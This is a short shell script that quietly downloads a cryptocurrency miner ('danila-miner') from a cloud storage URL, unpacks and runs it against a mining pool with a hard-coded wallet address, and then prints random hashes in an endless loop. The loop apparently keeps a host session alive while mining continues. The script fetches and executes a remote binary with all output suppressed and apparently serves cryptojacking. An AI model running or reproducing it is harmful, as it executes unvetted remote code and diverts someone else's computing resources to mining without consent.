#!/bin/bash

#!/bin/sh

#!/bin/bash

wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1

tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1

chmod +x danila-miner >/dev/null 2>&1

./danila-miner run https://server1.whalestonpool.com EQCRtyoS8-gsw_MyFSZ3JifU83Eg_93KriUBi5i4yxj4UomB

while [ 1 ]; do

  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done

sleep 2

done
